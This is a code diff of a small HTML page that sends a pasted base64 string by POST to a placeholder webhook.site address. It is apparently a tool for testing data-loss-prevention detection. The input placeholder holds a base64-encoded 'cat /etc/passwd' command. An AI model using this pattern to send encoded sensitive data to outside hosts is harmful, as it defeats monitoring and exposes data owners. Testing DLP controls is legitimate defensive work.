@@ -2,52 +2,52 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>EDM DLP Base64 Submit</title>
+  <title>Base64 EDM Submit</title>
   <style>
     body {
-      background-color: #121212;
-      color: white;
+      background-color: #1a1a1a;
+      color: #ffffff;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding-top: 80px;
+      padding-top: 50px;
     }
     input, button {
-      width: 60%;
-      padding: 12px;
-      font-size: 18px;
+      padding: 10px;
+      font-size: 16px;
       margin: 10px;
+      width: 60%;
     }
     #status {
       margin-top: 20px;
-      color: #00FF00;
+      font-size: 14px;
+      color: #00ff00;
     }
   </style>
 </head>
 <body>
-  <h1>EDM DLP Base64 Submit</h1>
-
-  <input type="text" id="b64Input" placeholder="Paste base64 string here..." />
-  <br />
-  <button onclick="sendToWebhook()">Submit</button>
+  <h1>EDM Base64 Submit</h1>
+  <input type="text" id="b64" placeholder="Paste base64 here (e.g. Y2F0IC9ldGMvcGFzc3dk)">
+  <br>
+  <button onclick="submitBase64()">Submit to Webhook</button>
   <div id="status"></div>
 
   <script>
-    function sendToWebhook() {
-      const base64 = document.getElementById("b64Input").value;
-      const webhookUrl = "https://webhook.site/YOUR-ID"; // 🔁 Replace with your actual webhook URL
+    function submitBase64() {
+      const base64 = document.getElementById("b64").value.trim();
+      const webhookURL = "https://webhook.site/YOUR-ID"; // 🔁 Replace this with your actual webhook.site URL
 
-      fetch(webhookUrl, {
+      fetch(webhookURL, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded"
         },
         body: "data=" + encodeURIComponent(base64)
       })
-      .then(response => {
+      .then(() => {
         document.getElementById("status").innerText = "✅ Submitted: " + base64;
       })
-      .catch(error => {
-        document.getElementById("status").innerText = "❌ Error: " + error;
+      .catch(err => {
+        document.getElementById("status").innerText = "❌ Error: " + err;
       });
     }
   </script>
